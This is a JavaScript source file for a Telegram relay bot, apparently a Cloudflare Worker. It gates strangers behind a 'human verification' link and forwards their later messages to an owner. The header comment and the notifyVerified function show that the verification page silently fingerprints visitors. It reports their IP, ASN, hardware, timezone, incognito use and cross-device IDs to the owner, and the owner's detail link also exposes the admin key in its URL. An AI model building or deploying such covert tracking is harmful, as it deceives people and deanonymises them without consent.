import { randToken } from './util.js';

/**
 * 双向中继 Bot:
 *   陌生人 → bot: 未验证则要求"完成人机验证"(展示 Turnstile + 静默采集指纹)
 *                 完成后,后续消息全部转发给 owner
 *   owner → bot: 回复某条转发消息 → bot 帮忙投递给对应用户
 *   任何人 /claim <ADMIN_KEY> → 成为 owner(首次或转移)
 */
export async function handleTelegram(request, env, ctx) {
  const update = await request.json().catch(() => null);
  if (!update?.message) return new Response('ok');
  ctx.waitUntil(dispatch(env, update.message).catch(() => {}));
  return new Response('ok');
}

async function dispatch(env, msg) {
  const from = msg.from || {};
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();

  // /claim 认领 owner
  if (text.startsWith('/claim')) {
    const arg = text.split(/\s+/)[1];
    if (arg && arg === env.ADMIN_KEY) {
      await setConfig(env, 'owner_id', String(from.id));
      await setConfig(env, 'owner_chat_id', String(chatId));
      return sendMessage(env, chatId,
        `✅ 你已成为本 bot 的 owner\nid: <code>${from.id}</code>\n\n以后所有验证用户的消息会转发到这里,直接回复即可对话。`);
    }
    return sendMessage(env, chatId, '❌ 密钥错误');
  }

  const ownerId = await getConfig(env, 'owner_id');
  if (!ownerId) {
    return sendMessage(env, chatId, '⚙️ Bot 未初始化,请 owner 发送 <code>/claim &lt;ADMIN_KEY&gt;</code> 认领。');
  }

  if (String(from.id) === ownerId) {
    return handleOwner(env, msg, text);
  }
  return handleTarget(env, msg, from, text);
}

/* -------- Owner 侧 -------- */

async function handleOwner(env, msg, text) {
  const chatId = msg.chat.id;

  if (text === '/start' || text === '/help') {
    return sendMessage(env, chatId,
      `👑 <b>Owner 面板</b>\n\n` +
      `• 回复任意转发消息 → 你的回复会被投递给对方\n` +
      `• <code>/users</code> - 已验证用户列表\n` +
      `• <code>/pending</code> - 待验证用户\n` +
      `• <code>/reset &lt;user_id&gt;</code> - 重置某用户验证状态(下次强制重做)`);
  }

  if (text === '/users') {
    const { results } = await env.DB.prepare(
      `SELECT tg_user_id, tg_username, tg_first_name, verified_at
         FROM users WHERE verified_at IS NOT NULL
         ORDER BY verified_at DESC LIMIT 30`
    ).all();
    if (!results.length) return sendMessage(env, chatId, '(暂无已验证用户)');
    const lines = results.map((r) =>
      `• ${escapeHtml(r.tg_first_name || '—')} ${r.tg_username ? '@' + escapeHtml(r.tg_username) : ''} <code>${r.tg_user_id}</code>`);
    return sendMessage(env, chatId, `<b>已验证 ${results.length} 人</b>\n\n${lines.join('\n')}`);
  }

  if (text === '/pending') {
    const { results } = await env.DB.prepare(
      `SELECT tg_user_id, tg_username, tg_first_name, created_at
         FROM users WHERE verified_at IS NULL
         ORDER BY created_at DESC LIMIT 30`
    ).all();
    if (!results.length) return sendMessage(env, chatId, '(无待验证)');
    const lines = results.map((r) =>
      `• ${escapeHtml(r.tg_first_name || '—')} ${r.tg_username ? '@' + escapeHtml(r.tg_username) : ''} <code>${r.tg_user_id}</code>`);
    return sendMessage(env, chatId, `<b>待验证 ${results.length} 人</b>\n\n${lines.join('\n')}`);
  }

  if (text.startsWith('/reset ')) {
    const uid = text.split(/\s+/)[1];
    await env.DB.prepare('UPDATE users SET verified_at = NULL WHERE tg_user_id = ?').bind(uid).run();
    return sendMessage(env, chatId, `已重置 ${uid} 的验证状态`);
  }

  // 回复某条转发消息 → 投递给对应目标
  if (msg.reply_to_message) {
    const row = await env.DB.prepare(
      'SELECT target_chat_id FROM relay_map WHERE owner_msg_id = ?'
    ).bind(String(msg.reply_to_message.message_id)).first();
    if (!row) {
      return sendMessage(env, chatId, '❌ 未找到该消息对应的目标(可能太旧)');
    }
    return relayToTarget(env, chatId, row.target_chat_id, msg);
  }

  return sendMessage(env, chatId, '💡 请回复某条被转发的消息来回复对方,或用 /help 查看命令。');
}

/* -------- 目标用户侧 -------- */

async function handleTarget(env, msg, from, text) {
  const uid = String(from.id);
  const chatId = String(msg.chat.id);
  const firstName = [from.first_name, from.last_name].filter(Boolean).join(' ') || null;

  // upsert users
  await env.DB.prepare(
    `INSERT INTO users (tg_user_id, tg_chat_id, tg_username, tg_first_name, created_at)
     VALUES (?,?,?,?,?)
     ON CONFLICT(tg_user_id) DO UPDATE SET
       tg_chat_id = excluded.tg_chat_id,
       tg_username = excluded.tg_username,
       tg_first_name = excluded.tg_first_name`
  ).bind(uid, chatId, from.username || null, firstName, Date.now()).run();

  const user = await env.DB.prepare('SELECT * FROM users WHERE tg_user_id = ?').bind(uid).first();

  if (!user.verified_at) {
    // 复用最近未完成的 session,避免每条消息生成新链接
    let session = await env.DB.prepare(
      `SELECT id FROM sessions WHERE tg_user_id = ? AND status = 'pending'
         ORDER BY created_at DESC LIMIT 1`
    ).bind(uid).first();
    let token;
    if (session) token = session.id;
    else {
      token = randToken(24);
      await env.DB.prepare(
        `INSERT INTO sessions (id, label, tg_chat_id, tg_user_id, tg_username, tg_first_name, created_at, status)
         VALUES (?, '首次验证', ?, ?, ?, ?, ?, 'pending')`
      ).bind(token, chatId, uid, from.username || null, firstName, Date.now()).run();
    }
    return sendMessage(env, msg.chat.id,
      `👋 请先完成人机验证:\n\n${env.BASE_URL}/c/${token}\n\n` +
      `完成后回来发消息即可继续对话。`);
  }

  // 已验证 → 转发到 owner
  const ownerChatId = await getConfig(env, 'owner_chat_id') || await getConfig(env, 'owner_id');
  const header =
    `👤 <b>${escapeHtml(user.tg_first_name || '匿名')}</b>` +
    `${user.tg_username ? ` @${escapeHtml(user.tg_username)}` : ''} ` +
    `<code>id:${uid}</code>\n\n`;

  await relayToOwner(env, ownerChatId, chatId, msg, header);
}

/* -------- 消息中继 -------- */

async function relayToOwner(env, ownerChatId, targetChatId, msg, header) {
  // 文本消息:带头部转到 owner + 记录映射便于回复
  if (msg.text) {
    const sent = await sendMessage(env, ownerChatId, header + escapeHtml(msg.text));
    const mid = sent?.result?.message_id;
    if (mid) await recordRelay(env, mid, targetChatId);
    return;
  }
  // 非文本:先发送 header 说明来源,再用 copyMessage 复制媒体过去
  const noticeSent = await sendMessage(env, ownerChatId, header + `<i>(以下为该用户发来的媒体)</i>`);
  const notifMid = noticeSent?.result?.message_id;
  if (notifMid) await recordRelay(env, notifMid, targetChatId);
  const copied = await tgApi(env, 'copyMessage', {
    chat_id: ownerChatId, from_chat_id: msg.chat.id, message_id: msg.message_id,
  });
  const copyMid = copied?.result?.message_id;
  if (copyMid) await recordRelay(env, copyMid, targetChatId);
}

async function relayToTarget(env, ownerChatId, targetChatId, msg) {
  if (msg.text) {
    await sendMessage(env, targetChatId, msg.text);
  } else {
    // owner 发的媒体也可以转过去
    await tgApi(env, 'copyMessage', {
      chat_id: targetChatId, from_chat_id: msg.chat.id, message_id: msg.message_id,
    });
  }
  // 给 owner 一个静默的 ✓ 反馈
  await tgApi(env, 'setMessageReaction', {
    chat_id: ownerChatId, message_id: msg.message_id, reaction: [{ type: 'emoji', emoji: '✍' }],
  }).catch(() => {});
}

async function recordRelay(env, ownerMsgId, targetChatId) {
  await env.DB.prepare(
    'INSERT OR REPLACE INTO relay_map (owner_msg_id, target_chat_id, created_at) VALUES (?, ?, ?)'
  ).bind(String(ownerMsgId), String(targetChatId), Date.now()).run();
}

/* -------- 从 collect.js 调用:验证完成后通知 owner -------- */

export async function notifyVerified(env, session, fp) {
  const ownerChatId = await getConfig(env, 'owner_chat_id') || await getConfig(env, 'owner_id');
  if (!ownerChatId) return;

  if (session.tg_user_id) {
    await env.DB.prepare(
      `UPDATE users SET verified_at = ?, first_session_id = COALESCE(first_session_id, ?)
         WHERE tg_user_id = ?`
    ).bind(Date.now(), session.id, session.tg_user_id).run();
  }

  const link = `${env.BASE_URL}/?key=${env.ADMIN_KEY}`;
  const text =
    `✅ <b>新用户验证完成</b>\n\n` +
    `👤 <b>${escapeHtml(session.tg_first_name || '匿名')}</b>` +
    `${session.tg_username ? ` @${escapeHtml(session.tg_username)}` : ''} ` +
    `<code>id:${session.tg_user_id || '?'}</code>\n\n` +
    `<b>设备摘要</b>\n` +
    `• GPU: <code>${escapeHtml((fp.gpu || 'N/A').slice(0, 60))}</code>\n` +
    `• 屏幕: ${escapeHtml(fp.screen || 'N/A')} · DPR ${fp.dpr || '?'}\n` +
    `• 硬件: ${fp.cores || '?'} 核 · ${fp.memory || '?'}GB\n` +
    `• 时区: ${escapeHtml(fp.timezone || 'N/A')}\n` +
    `• IP: <code>${escapeHtml(fp.ip || '')}</code> ${fp.country || ''} ASN${fp.asn || ''}\n` +
    `• 机器人风险: <b>${(fp.botScore * 100).toFixed(0)}%</b>\n` +
    `• 隐身模式: ${fp.incognito ? '是 ⚠️' : '否'}\n` +
    `• Turnstile: ${fp.turnstileOk === true ? '✅ 通过' : fp.turnstileOk === false ? '❌ 未通过' : '未提交'}\n` +
    `• visitorId: <code>${(fp.visitorId || '').slice(0, 16)}…</code>\n` +
    `• cross_id (设备): <code>${(fp.crossId || '').slice(0, 16)}…</code>\n\n` +
    `<a href="${link}">🔗 查看完整详情</a>\n\n` +
    `<i>此人后续消息将自动转发到本对话,直接回复即可对话。</i>`;

  await sendMessage(env, ownerChatId, text);
}

/* -------- 底层 -------- */

async function tgApi(env, method, payload) {
  if (!env.TELEGRAM_BOT_TOKEN) return null;
  const r = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return r.json().catch(() => null);
}

function sendMessage(env, chatId, text) {
  return tgApi(env, 'sendMessage', {
    chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true,
  });
}

async function getConfig(env, key) {
  const r = await env.DB.prepare('SELECT value FROM config WHERE key = ?').bind(key).first();
  return r?.value || null;
}
async function setConfig(env, key, value) {
  await env.DB.prepare(
    'INSERT INTO config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  ).bind(key, value).run();
}

function escapeHtml(s) {
  return String(s ?? '').replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
}
